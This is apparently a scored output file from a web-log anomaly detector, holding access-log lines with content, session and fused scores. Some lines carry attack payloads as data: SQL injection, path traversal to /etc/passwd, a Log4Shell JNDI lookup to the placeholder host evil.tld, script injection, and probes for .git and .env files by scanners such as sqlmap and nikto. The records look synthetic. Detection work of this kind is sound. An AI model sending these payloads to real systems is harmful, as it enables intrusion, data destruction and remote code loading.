score_content,score_session,score_fused,line
5.898452281951904,778.495361328125,392.19690680503845,{"remote_addr": "94.185.161.5", "time_local": "11/Jan/2025:09:01:04 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 4901, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
1.4025087356567383,73.28229522705078,37.34240198135376,{"remote_addr": "198.81.26.8", "time_local": "11/Jan/2025:09:01:05 -0700", "request": "GET /logout HTTP/2", "status": 204, "body_bytes_sent": 12761, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
4.711099624633789,777.7589111328125,391.23500537872314,{"remote_addr": "15.57.88.182", "time_local": "11/Jan/2025:09:01:05 -0700", "request": "HEAD / HTTP/2", "status": 200, "body_bytes_sent": 3500, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
1.3630255460739136,582.7689208984375,292.0659732222557,{"remote_addr": "203.31.249.190", "time_local": "11/Jan/2025:09:01:06 -0700", "request": "TRACE /about HTTP/2", "status": 200, "body_bytes_sent": 12619, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
1.3385156393051147,814.7218627929688,408.03018921613693,{"remote_addr": "52.159.160.117", "time_local": "11/Jan/2025:09:01:07 -0700", "request": "GET /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 11183, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.8721649646759033,5834.2958984375,2918.084031701088,{"remote_addr": "128.56.52.157", "time_local": "11/Jan/2025:09:01:07 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 404, "body_bytes_sent": 59, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.384700775146484,1845.1302490234375,924.757474899292,{"remote_addr": "56.28.48.65", "time_local": "11/Jan/2025:09:01:08 -0700", "request": "HEAD /search?q=router HTTP/2", "status": 301, "body_bytes_sent": 9965, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
4.884500503540039,128.03829956054688,66.46140003204346,{"remote_addr": "6.188.137.33", "time_local": "11/Jan/2025:09:01:09 -0700", "request": "HEAD /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 15004, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
6.502283573150635,589.6159057617188,298.0590946674347,{"remote_addr": "152.183.13.20", "time_local": "11/Jan/2025:09:01:09 -0700", "request": "OPTIONS /admin HTTP/2", "status": 200, "body_bytes_sent": 17936, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
2.899569034576416,764.0237426757812,383.46165585517883,{"remote_addr": "250.144.178.15", "time_local": "11/Jan/2025:09:01:10 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 201, "body_bytes_sent": 3566, "http_referer": "-", "http_user_agent": "dirb/2.22"}
6.946805000305176,868.6416015625,437.7942032814026,{"remote_addr": "73.173.67.196", "time_local": "11/Jan/2025:09:01:10 -0700", "request": "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 15235, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
1.8801922798156738,729.83251953125,365.85635590553284,{"remote_addr": "135.13.17.36", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "POST /.git/config HTTP/2", "status": 200, "body_bytes_sent": 15271, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
6.446992874145508,729.0684814453125,367.757737159729,{"remote_addr": "121.84.226.10", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "OPTIONS /logout HTTP/2", "status": 200, "body_bytes_sent": 661, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
2.393115758895874,583.1364135742188,292.7647646665573,{"remote_addr": "77.211.124.173", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "DELETE /profile HTTP/2", "status": 200, "body_bytes_sent": 12200, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
5.994807243347168,833.75634765625,419.8755774497986,{"remote_addr": "90.254.161.150", "time_local": "11/Jan/2025:09:01:12 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 6304, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
1.3911774158477783,793.6424560546875,397.51681673526764,{"remote_addr": "156.171.91.211", "time_local": "11/Jan/2025:09:01:12 -0700", "request": "POST /contact HTTP/2", "status": 204, "body_bytes_sent": 11007, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
2.908407211303711,729.5912475585938,366.24982738494873,{"remote_addr": "182.119.60.175", "time_local": "11/Jan/2025:09:01:13 -0700", "request": "DELETE /contact HTTP/2", "status": 200, "body_bytes_sent": 14263, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
1.2282896041870117,775.1036376953125,388.16596364974976,{"remote_addr": "100.2.45.29", "time_local": "11/Jan/2025:09:01:14 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 12198, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
1.4575698375701904,648.8953857421875,325.17647778987885,{"remote_addr": "146.146.48.55", "time_local": "11/Jan/2025:09:01:15 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 14285, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.5640215873718262,109.04106140136719,55.30254149436951,{"remote_addr": "31.104.197.101", "time_local": "11/Jan/2025:09:01:15 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 7096, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.1917996406555176,631.0853271484375,316.1385633945465,{"remote_addr": "218.231.56.164", "time_local": "11/Jan/2025:09:01:16 -0700", "request": "GET /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 9972, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.9139249324798584,5801.11474609375,2901.514335513115,{"remote_addr": "170.32.45.118", "time_local": "11/Jan/2025:09:01:16 -0700", "request": "POST /login HTTP/2", "status": 404, "body_bytes_sent": 560, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
1.971413493156433,2184.395263671875,1093.1833385825157,{"remote_addr": "159.30.7.203", "time_local": "11/Jan/2025:09:01:17 -0700", "request": "PUT /.env HTTP/2", "status": 304, "body_bytes_sent": 14551, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
1.7472593784332275,570.2291259765625,285.98819267749786,{"remote_addr": "9.28.11.10", "time_local": "11/Jan/2025:09:01:18 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 17305, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.2334563732147217,829.0442504882812,415.138853430748,{"remote_addr": "180.192.241.57", "time_local": "11/Jan/2025:09:01:19 -0700", "request": "GET /api/products HTTP/2", "status": 200, "body_bytes_sent": 6120, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
1.3784704208374023,791.55712890625,396.4677996635437,{"remote_addr": "241.168.33.46", "time_local": "11/Jan/2025:09:01:20 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 11750, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.2765235900878906,2076.617919921875,1038.9472217559814,{"remote_addr": "78.52.19.216", "time_local": "11/Jan/2025:09:01:20 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 302, "body_bytes_sent": 12552, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
1.4852559566497803,790.9735717773438,396.22941386699677,{"remote_addr": "76.149.44.200", "time_local": "11/Jan/2025:09:01:21 -0700", "request": "POST /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 3070, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
2.583678722381592,1863.0322265625,932.8079526424408,{"remote_addr": "15.75.189.113", "time_local": "11/Jan/2025:09:01:22 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 301, "body_bytes_sent": 16173, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.7491828203201294,533.3279418945312,267.5385623574257,{"remote_addr": "84.218.112.159", "time_local": "11/Jan/2025:09:01:23 -0700", "request": "TRACE /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 12654, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
4.582335472106934,1868.640625,936.6114802360535,{"remote_addr": "66.113.105.41", "time_local": "11/Jan/2025:09:01:24 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 302, "body_bytes_sent": 1198, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.3445210456848145,11831.8603515625,5917.102436304092,{"remote_addr": "67.138.18.122", "time_local": "11/Jan/2025:09:01:24 -0700", "request": "GET /logout HTTP/2", "status": 500, "body_bytes_sent": 884, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
4.822085380554199,533.5973510742188,269.2097182273865,{"remote_addr": "104.215.87.64", "time_local": "11/Jan/2025:09:01:25 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 8541, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
6.147456645965576,784.834228515625,395.4908425807953,{"remote_addr": "124.142.80.7", "time_local": "11/Jan/2025:09:01:25 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 15731, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.3756632804870605,1948.7222900390625,975.5489766597748,{"remote_addr": "95.128.25.38", "time_local": "11/Jan/2025:09:01:26 -0700", "request": "DELETE /profile HTTP/2", "status": 302, "body_bytes_sent": 7730, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.7915644645690918,725.3331298828125,363.5623471736908,{"remote_addr": "174.181.221.213", "time_local": "11/Jan/2025:09:01:26 -0700", "request": "TRACE /dashboard HTTP/2", "status": 200, "body_bytes_sent": 13440, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
4.509499549865723,777.4299926757812,390.9697461128235,{"remote_addr": "194.240.128.157", "time_local": "11/Jan/2025:09:01:27 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 2488, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
9.788660049438477,618.3656616210938,314.0771608352661,{"remote_addr": "251.213.87.181", "time_local": "11/Jan/2025:09:01:28 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 10172, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
2.59194278717041,68.50125122070312,35.54659700393677,{"remote_addr": "90.17.79.171", "time_local": "11/Jan/2025:09:01:28 -0700", "request": "DELETE /index.html HTTP/2", "status": 200, "body_bytes_sent": 12045, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.7326948642730713,520.91357421875,261.32313454151154,{"remote_addr": "127.220.139.40", "time_local": "11/Jan/2025:09:01:29 -0700", "request": "GET /profile HTTP/2", "status": 204, "body_bytes_sent": 15794, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.318737268447876,54.39006423950195,27.854400753974915,{"remote_addr": "189.55.83.217", "time_local": "11/Jan/2025:09:01:29 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 11507, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
6.034823417663574,795.5565185546875,400.79567098617554,{"remote_addr": "68.79.50.240", "time_local": "11/Jan/2025:09:01:30 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 11661, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.6992512941360474,1396.3480224609375,699.0236368775368,{"remote_addr": "221.8.238.117", "time_local": "11/Jan/2025:09:01:31 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 301, "body_bytes_sent": 6904, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.062034845352173,567.1201171875,284.5910760164261,{"remote_addr": "39.84.194.77", "time_local": "11/Jan/2025:09:01:31 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 1032, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.8194125890731812,814.1574096679688,407.98841112852097,{"remote_addr": "19.232.133.65", "time_local": "11/Jan/2025:09:01:32 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 10844, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
1.4734997749328613,774.7598876953125,388.1166937351227,{"remote_addr": "125.30.107.222", "time_local": "11/Jan/2025:09:01:32 -0700", "request": "POST /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 2853, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
1.4576023817062378,621.6781005859375,311.56785148382187,{"remote_addr": "59.150.119.171", "time_local": "11/Jan/2025:09:01:33 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 12814, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.5230324268341064,790.7232666015625,396.1231495141983,{"remote_addr": "173.146.97.143", "time_local": "11/Jan/2025:09:01:33 -0700", "request": "TRACE /server-status HTTP/2", "status": 200, "body_bytes_sent": 475, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.371412992477417,637.0407104492188,319.2060617208481,{"remote_addr": "232.33.210.120", "time_local": "11/Jan/2025:09:01:34 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 13717, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.4672318696975708,1383.7264404296875,692.5968361496925,{"remote_addr": "63.178.179.223", "time_local": "11/Jan/2025:09:01:35 -0700", "request": "GET /assets/app.css HTTP/2", "status": 302, "body_bytes_sent": 12681, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.1574220657348633,1881.284423828125,941.2209229469299,{"remote_addr": "201.139.29.171", "time_local": "11/Jan/2025:09:01:35 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 5949, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
5.018820285797119,5791.9970703125,2898.5079452991486,{"remote_addr": "168.21.76.136", "time_local": "11/Jan/2025:09:01:36 -0700", "request": "HEAD /search?q=laptop HTTP/2", "status": 403, "body_bytes_sent": 1170, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.7758450508117676,74.87287902832031,38.32436203956604,{"remote_addr": "164.176.105.24", "time_local": "11/Jan/2025:09:01:37 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 15221, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.3550875186920166,630.1898193359375,315.77245342731476,{"remote_addr": "127.63.220.240", "time_local": "11/Jan/2025:09:01:37 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 5422, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.763164758682251,515.1427001953125,258.4529324769974,{"remote_addr": "100.108.120.182", "time_local": "11/Jan/2025:09:01:39 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 12504, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.3362399339675903,775.6672973632812,388.5017686486244,{"remote_addr": "189.2.78.233", "time_local": "11/Jan/2025:09:01:39 -0700", "request": "POST /dashboard HTTP/2", "status": 200, "body_bytes_sent": 9498, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
11.298702239990234,2154.86279296875,1083.0807476043701,{"remote_addr": "193.161.203.214", "time_local": "11/Jan/2025:09:01:40 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 304, "body_bytes_sent": 5781, "http_referer": "-", "http_user_agent": "dirb/2.22"}
1.5960631370544434,829.2151489257812,415.40560603141785,{"remote_addr": "63.99.105.40", "time_local": "11/Jan/2025:09:01:41 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 2561, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
1.1475260257720947,631.93701171875,316.54226887226105,{"remote_addr": "85.237.34.142", "time_local": "11/Jan/2025:09:01:42 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 11123, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.6783220767974854,514.72802734375,258.20317471027374,{"remote_addr": "138.227.41.201", "time_local": "11/Jan/2025:09:01:43 -0700", "request": "POST /api/products HTTP/2", "status": 200, "body_bytes_sent": 8677, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
